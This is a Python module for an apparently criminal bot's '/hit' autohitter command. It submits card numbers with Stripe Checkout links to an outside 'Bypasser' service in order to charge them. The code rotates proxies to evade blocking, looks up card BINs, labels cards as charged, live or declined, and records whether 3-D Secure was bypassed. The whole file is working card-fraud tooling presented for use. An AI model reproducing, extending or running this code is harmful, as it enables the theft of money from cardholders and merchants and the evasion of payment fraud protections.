"""
Stripe Checkout via ravenxkiller hit.php API.
Used by /hit (Tools » Autohitter). Blocking HTTP — call via asyncio.to_thread.
"""

from __future__ import annotations

import json
import random
import re
import time
from pathlib import Path
from typing import Any
from urllib.parse import quote, unquote, urlencode

import requests
import urllib3

try:
    from helpers import parse_proxy_format, proxy_dict_to_url
except ImportError:

    def parse_proxy_format(raw: str) -> dict[str, Any] | None:
        raw = (raw or "").strip()
        if not raw:
            return None
        for prefix in ("http://", "https://", "socks5://", "socks4://"):
            if raw.startswith(prefix):
                raw = raw[len(prefix) :]
        if "@" in raw:
            auth, hostport = raw.rsplit("@", 1)
            user, pw = auth.split(":", 1) if ":" in auth else (auth, "")
            ip, port = hostport.split(":", 1) if ":" in hostport else (hostport, "")
            return {"ip": ip, "port": port, "username": user, "password": pw}
        parts = raw.split(":")
        if len(parts) >= 4:
            return {"ip": parts[0], "port": parts[1], "username": parts[2], "password": parts[3]}
        if len(parts) == 2:
            return {"ip": parts[0], "port": parts[1], "username": "", "password": ""}
        return None

    def proxy_dict_to_url(proxy_data: dict[str, Any]) -> str | None:
        ip = str(proxy_data.get("ip") or "").strip()
        port = str(proxy_data.get("port") or "").strip()
        user = str(proxy_data.get("username") or "").strip()
        pw = str(proxy_data.get("password") or "").strip()
        if not ip or not port:
            return None
        if user and pw:
            return f"http://{user}:{pw}@{ip}:{port}"
        return f"http://{ip}:{port}"


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HIT_API_URL = "https://ravenxkiller.site/Bypasser/bot.php"

_SESSION_DEAD_PHRASES = (
    "no longer active",
    "has already been completed",
    "session has expired",
    "session expired",
    "session is expired",
    "checkout session has expired",
    "session voided",
    "status of canceled",
)


def parse_co_card(card_str: str) -> dict[str, str] | None:
    parts = re.split(r"[|:]", card_str.strip())
    if len(parts) != 4:
        return None
    mm = f"{int(parts[1]):02d}"
    yy = parts[2].strip()
    if len(yy) <= 2:
        yy = "20" + yy.zfill(2)
    return {"cc": parts[0].strip(), "mm": mm, "yy": yy, "cvv": parts[3].strip()}


def card_to_api_string(card_str: str) -> str | None:
    """Normalize to cc|mm|yy|cvv for hit.php."""
    card = parse_co_card(card_str)
    if not card:
        return None
    return f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"


def encode_checkout_for_api(checkout_url: str) -> str:
    """
    hit.php accepts # in POST; for GET use %23.
    Normalize user input then let quote() encode # → %23 on the wire.
    """
    url = (checkout_url or "").strip()
    if not url:
        return ""
    if "%23" in url and "#" not in url:
        url = unquote(url)
    return url


def _is_session_dead(msg: str) -> bool:
    low = (msg or "").lower()
    return any(p in low for p in _SESSION_DEAD_PHRASES)


def _proxy_to_api_string(proxy_data: dict[str, Any] | str | None) -> str | None:
    """hit.php expects host:port:user:pass (NOT http://user:pass@host:port)."""
    if not proxy_data:
        return None
    if isinstance(proxy_data, str):
        raw = proxy_data.strip()
        if not raw:
            return None
        if raw.startswith(("http://", "https://", "socks5://", "socks4://")):
            parsed = parse_proxy_format(raw)
            if parsed:
                proxy_data = parsed
            else:
                return raw
        else:
            return raw

    if not isinstance(proxy_data, dict):
        return None

    ip = str(proxy_data.get("ip") or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = str(proxy_data.get("username") or "").strip()
    pw = str(proxy_data.get("password") or "").strip()
    if ip and port and user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    if ip and port:
        return f"{ip}:{port}"
    return proxy_dict_to_url(proxy_data)


def _load_user_proxies(user_id: int) -> list[dict[str, Any]]:
    path = Path(__file__).resolve().parent / "proxy.json"
    if not path.is_file():
        return []
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, dict):
        proxies = [proxies] if proxies else []
    if isinstance(proxies, str):
        proxies = [proxies] if proxies.strip() else []
    out: list[dict[str, Any]] = []
    for item in proxies:
        if isinstance(item, dict):
            out.append(item)
        elif isinstance(item, str) and item.strip():
            parsed = parse_proxy_format(item.strip())
            if parsed:
                out.append(parsed)
    return out


def _build_proxy_pool(
    proxy_data: dict[str, Any] | None = None,
    proxy_list: list | None = None,
) -> list[dict[str, Any]]:
    pool: list[dict[str, Any]] = []
    seen: set[str] = set()
    sources = list(proxy_list or [])
    if proxy_data and proxy_data not in sources:
        sources.insert(0, proxy_data)
    for item in sources:
        if isinstance(item, str):
            parsed = parse_proxy_format(item.strip())
            if parsed:
                item = parsed
        if not isinstance(item, dict):
            continue
        url = _proxy_to_api_string(item)
        if not url or url in seen:
            continue
        seen.add(url)
        pool.append(item)
    return pool


def bin_lookup(bin6: str) -> dict[str, Any]:
    """Sync BIN lookup for display in bot results."""
    fallback = {
        "brand": "UNKNOWN",
        "type": "UNKNOWN",
        "level": "STANDARD",
        "bank": "Unknown",
        "country": "Unknown",
        "country_code": "",
    }
    bin6 = (bin6 or "").strip()[:6]
    if len(bin6) < 6:
        return fallback
    try:
        r = requests.get(
            f"https://bins.antipublic.cc/bins/{bin6}",
            timeout=10,
            verify=False,
        )
        d = r.json() if r.ok else {}
    except (requests.RequestException, json.JSONDecodeError, ValueError):
        d = {}
    if not isinstance(d, dict) or not d.get("brand"):
        return fallback
    ccode = str(d.get("country") or d.get("country_code") or "").upper()[:2]
    country_line = f"{(d.get('country_name') or 'Unknown').strip()} {(d.get('country_flag') or '')}".strip()
    if ccode:
        country_line += f"  (ISO {ccode})"
    return {
        "brand": d.get("brand") or "UNKNOWN",
        "type": d.get("type") or "UNKNOWN",
        "level": d.get("level") or "STANDARD",
        "bank": d.get("bank") or "Unknown",
        "country": country_line,
        "country_code": ccode,
    }


def _first_str(data: dict[str, Any], *keys: str) -> str:
    for key in keys:
        val = data.get(key)
        if val is not None and str(val).strip():
            return str(val).strip()
    return ""


def _parse_amount_cents(data: dict[str, Any]) -> int:
    price = _first_str(data, "price", "amount", "total")
    if price:
        m = re.search(r"([A-Za-z]{3})\s+([\d,]+(?:\.\d+)?)", price)
        if m:
            try:
                cents = int(round(float(m.group(2).replace(",", "")) * 100))
                if cents > 0:
                    return cents
            except (TypeError, ValueError):
                pass
        m = re.search(r"([\d,]+(?:\.\d+)?)\s*([A-Za-z]{3})", price)
        if m:
            try:
                cents = int(round(float(m.group(1).replace(",", "")) * 100))
                if cents > 0:
                    return cents
            except (TypeError, ValueError):
                pass
    for key in ("amount_cents", "amount", "total", "price"):
        val = data.get(key)
        if val is None:
            continue
        try:
            n = int(float(val))
            if n > 0:
                return n if n > 100 else n * 100
        except (TypeError, ValueError):
            continue
    return 0


def _normalize_hit_status(raw_status: str) -> str:
    """
    hit.php returns: charge | live | dead | error
    Bot display:     charged | approved | declined
    """
    s = (raw_status or "").lower().strip()
    if s in {"charge", "charged", "success", "succeeded", "paid"}:
        return "charged"
    if s in {"live", "approved", "approve"}:
        return "approved"
    if s in {"dead", "declined", "decline", "failed", "error"}:
        return "declined"
    return "declined"


def _session_dead_from_text(text: str) -> bool:
    low = (text or "").lower()
    return any(
        p in low
        for p in _SESSION_DEAD_PHRASES
    )


def _map_hit_response(body: dict[str, Any]) -> tuple[str, str, str]:
    """
    Parse hit.php JSON → (api_status, result_status, result_msg).

    hit.php api_status: charge | live | dead | error
    bot result_status:  charged | approved | declined
    """
    api_status = _first_str(body, "status", "Status", "state").lower()
    message = _first_str(body, "message", "msg", "detail", "reason", "error", "description")
    if not message:
        message = api_status or "Unknown"

    blob = f"{api_status} {message}".lower()

    if api_status == "error":
        return api_status, "declined", message

    if api_status in {"charge", "charged"} or any(
        x in blob for x in ("payment successful", "succeeded", " paid")
    ):
        return api_status or "charge", "charged", message or "Payment Successful"

    if api_status == "live" or any(
        k in blob
        for k in (
            "insufficient_funds",
            "insufficient funds",
            "incorrect_cvc",
            "invalid_cvc",
            "security code is incorrect",
            "invalid security code",
        )
    ):
        return api_status or "live", "approved", message

    if api_status in {"dead", "declined"}:
        return api_status or "dead", "declined", message or "Declined"

    if any(x in blob for x in ("declined", "failed", "reject", "denied")):
        return api_status or "dead", "declined", message or "Declined"

    if "proxyerror" in blob.replace(" ", "") or "unable to connect to proxy" in blob:
        return api_status or "dead", "declined", message or "Proxy Error"

    if "3ds" in blob or "challenge" in blob or "hcaptcha" in blob:
        return api_status or "dead", "declined", message or "Declined"

    normalized = _normalize_hit_status(api_status)
    return api_status or normalized, normalized, message or "Unknown"


def _build_hit_url(
    checkout_url: str,
    card_str: str,
    proxy: str | None = None,
) -> str:
    checkout = encode_checkout_for_api(checkout_url)
    base_qs = urlencode({"cc": card_str, "proxy": proxy or ""}, quote_via=quote)
    return f"{HIT_API_URL}?{base_qs}&checkout={quote(checkout, safe='')}"


def _hit_checkout(
    checkout_url: str,
    card_str: str,
    proxy: str | None = None,
    email: str | None = None,
    *,
    timeout: int = 120,
) -> dict[str, Any]:
    api_card = card_to_api_string(card_str)
    if not api_card:
        return {"ok": False, "error": "Invalid card format (use cc|mm|yy|cvv)"}

    hit_url = _build_hit_url(checkout_url, api_card, proxy)

    try:
        r = requests.get(hit_url, timeout=timeout, verify=False)
    except requests.Timeout:
        return {"ok": False, "error": "hit.php timeout"}
    except requests.RequestException as exc:
        return {"ok": False, "error": f"hit.php error: {exc}"}

    raw_text = r.text or ""
    try:
        body = r.json() if raw_text else {}
    except json.JSONDecodeError:
        body = {"status": "error", "message": raw_text[:300]}

    if not isinstance(body, dict):
        body = {"status": "error", "message": str(body)[:300]}

    if r.status_code >= 500:
        return {
            "ok": False,
            "error": _first_str(body, "message", "error", "detail") or f"hit.php HTTP {r.status_code}",
        }

    api_status, result_status, result_msg = _map_hit_response(body)

    if api_status == "error":
        return {
            "ok": False,
            "error": result_msg,
            "session_dead": _session_dead_from_text(result_msg),
            "result_status": "declined",
            "result_msg": result_msg,
            "raw": body,
        }

    merchant = _first_str(body, "merchant", "merchant_name", "store", "seller") or "Unknown"
    product = _first_str(body, "product", "product_name", "item", "description") or "Unknown"
    price_display = _first_str(body, "price", "amount", "total") or "-"
    currency = "USD"
    m = re.search(r"([A-Za-z]{3})\s+([\d.]+)", price_display)
    if m:
        currency = m.group(1).upper()
    elif re.search(r"([\d.]+)\s*([A-Za-z]{3})", price_display):
        m2 = re.search(r"([\d.]+)\s*([A-Za-z]{3})", price_display)
        if m2:
            currency = m2.group(2).upper()

    amount_cents = _parse_amount_cents(body)
    success_url = _first_str(body, "success_url", "return_url", "redirect_url", "url")
    time_taken = body.get("time_taken")
    if time_taken is None:
        time_taken = body.get("seconds")

    bin_info = body.get("bin")
    if not isinstance(bin_info, dict):
        bin_info = {}

    msg_lower = result_msg.lower()
    hcaptcha = "hcaptcha" in msg_lower or "captcha" in msg_lower
    if isinstance(body.get("3d_bypassed"), bool):
        tds_bypassed = bool(body["3d_bypassed"])
    else:
        tds_bypassed = (
            result_status == "charged"
            and not hcaptcha
            and "3ds not bypassed" not in msg_lower
            and "challenge" not in msg_lower
            and "otp" not in msg_lower
        )

    return {
        "ok": True,
        "merchant": merchant,
        "product": product,
        "currency": currency,
        "amount_cents": amount_cents,
        "price_display": price_display,
        "api_status": api_status,
        "result_status": result_status,
        "result_msg": result_msg,
        "success_url": success_url,
        "seconds": float(time_taken) if time_taken is not None else None,
        "time_taken": float(time_taken) if time_taken is not None else None,
        "bin_info": bin_info,
        "hcaptcha": hcaptcha,
        "tds_bypassed": tds_bypassed,
        "3d_bypassed": tds_bypassed,
        "session_dead": _session_dead_from_text(result_msg),
        "raw": body,
    }


def run_hit_check(
    checkout_url: str,
    card_str: str,
    proxy_data: dict[str, Any] | None = None,
    max_proxy_retries: int = 3,
    nopecha_key: str = "",
    proxy_list: list | None = None,
) -> dict[str, Any]:
    """Main entry used by bot.py /hit command."""
    card = parse_co_card(card_str)
    if not card:
        return {"ok": False, "error": "Invalid card format (use cc|mm|yy|cvv)"}

    proxy_pool = _build_proxy_pool(proxy_data, proxy_list)
    if not proxy_pool:
        return {"ok": False, "error": "No proxy set"}

    attempts = min(len(proxy_pool), max(1, int(max_proxy_retries or 1)))
    t0 = time.perf_counter()
    bin6 = card["cc"][:6] if len(card["cc"]) >= 6 else card["cc"]
    bin_row = bin_lookup(bin6)

    last_err: str | None = None
    for attempt in range(attempts):
        proxy_str = _proxy_to_api_string(proxy_pool[attempt % len(proxy_pool)])
        result = _hit_checkout(checkout_url, card_str, proxy=proxy_str)

        if not result.get("ok"):
            last_err = str(result.get("error") or "Checkout failed")
            if _is_session_dead(last_err):
                break
            continue

        elapsed = result.get("seconds")
        if elapsed is None:
            elapsed = round(time.perf_counter() - t0, 2)

        raw_bin = result.get("bin_info") or {}
        if isinstance(raw_bin, dict) and raw_bin.get("brand"):
            bin_row = {
                "brand": raw_bin.get("brand") or bin_row["brand"],
                "type": raw_bin.get("type") or bin_row["type"],
                "level": raw_bin.get("level") or bin_row["level"],
                "bank": raw_bin.get("bank") or bin_row["bank"],
                "country": raw_bin.get("country") or bin_row["country"],
                "country_code": raw_bin.get("country_code") or bin_row["country_code"],
            }

        return {
            "ok": True,
            "merchant": result.get("merchant") or "Unknown",
            "product": result.get("product") or "Unknown",
            "currency": result.get("currency") or "USD",
            "price_display": result.get("price_display") or "-",
            "amount_cents": int(result.get("amount_cents") or 0),
            "result_status": result.get("result_status", "declined"),
            "result_msg": result.get("result_msg", "Unknown"),
            "api_status": result.get("api_status", ""),
            "seconds": elapsed,
            "time_taken": elapsed,
            "bin_info": bin_row,
            "success_url": result.get("success_url") or "",
            "3d_bypassed": bool(result.get("3d_bypassed")),
            "tds_bypassed": bool(result.get("tds_bypassed")),
            "hcaptcha": bool(result.get("hcaptcha")),
            "session_dead": bool(result.get("session_dead")),
            "raw": result.get("raw") or {},
        }

    return {
        "ok": False,
        "error": last_err or "Checkout failed",
        "session_dead": _is_session_dead(last_err or ""),
    }


def run_co_check(checkout_url: str, card_str: str, user_id: int) -> dict[str, Any]:
    """
    Charge card via hit.php using the user's proxy list from proxy.json.
    Returns keys: ok, error?, merchant, product, currency, price_display,
    result_status (charged|approved|declined), result_msg, seconds
    """
    card = parse_co_card(card_str)
    if not card:
        return {"ok": False, "error": "Invalid card format (use cc|mm|yy|cvv)"}

    proxy_pool = _load_user_proxies(user_id)
    if not proxy_pool:
        return {"ok": False, "error": "No proxy set"}

    random.shuffle(proxy_pool)
    t0 = time.perf_counter()
    bin6 = card["cc"][:6] if len(card["cc"]) >= 6 else card["cc"]
    bin_row = bin_lookup(bin6)

    last_err: str | None = None
    for proxy_data in proxy_pool[:11]:
        proxy_str = _proxy_to_api_string(proxy_data)
        result = _hit_checkout(checkout_url, card_str, proxy=proxy_str)

        if not result.get("ok"):
            last_err = str(result.get("error") or "Checkout failed")
            if _is_session_dead(last_err):
                break
            continue

        elapsed = result.get("seconds")
        if elapsed is None:
            elapsed = round(time.perf_counter() - t0, 2)

        raw_bin = result.get("bin_info") or {}
        if isinstance(raw_bin, dict) and raw_bin.get("brand"):
            bin_row = {
                "brand": raw_bin.get("brand") or bin_row["brand"],
                "type": raw_bin.get("type") or bin_row["type"],
                "level": raw_bin.get("level") or bin_row["level"],
                "bank": raw_bin.get("bank") or bin_row["bank"],
                "country": raw_bin.get("country") or bin_row["country"],
                "country_code": raw_bin.get("country_code") or bin_row["country_code"],
            }

        return {
            "ok": True,
            "merchant": result.get("merchant") or "Unknown",
            "product": result.get("product") or "Unknown",
            "currency": result.get("currency") or "USD",
            "price_display": result.get("price_display") or "-",
            "amount_cents": int(result.get("amount_cents") or 0),
            "result_status": result.get("result_status", "declined"),
            "result_msg": result.get("result_msg", "Unknown"),
            "api_status": result.get("api_status", ""),
            "seconds": elapsed,
            "time_taken": elapsed,
            "proxy_used": bool(proxy_str),
            "bin_info": bin_row,
            "success_url": result.get("success_url") or "",
            "3d_bypassed": bool(result.get("3d_bypassed")),
            "tds_bypassed": bool(result.get("tds_bypassed")),
            "hcaptcha": bool(result.get("hcaptcha")),
            "session_dead": bool(result.get("session_dead")),
            "raw": result.get("raw") or {},
        }

    ret: dict[str, Any] = {"ok": False, "error": last_err or "Checkout failed"}
    if last_err and _is_session_dead(last_err):
        ret["session_dead"] = True
    return ret


def try_grab_session(checkout_url: str, user_id: int) -> dict[str, Any]:
    """
    hit.php requires cc — session-only probe not supported.
    Returns error so bot can ask user to run a full /hit instead.
    """
    proxies = _load_user_proxies(user_id)
    if not proxies:
        return {"error": "No proxy set"}
    return {
        "error": "hit.php requires cc + checkout — use /hit with a card to test session",
        "checkout_encoded": encode_checkout_for_api(checkout_url),
    }


def poll_pi_status(pk: str, pi_id: str, pi_secret: str) -> dict[str, str]:
    """Legacy stub — PI polling handled by hit.php."""
    return {"status": "unknown", "msg": "Not supported (hit.php API mode)"}
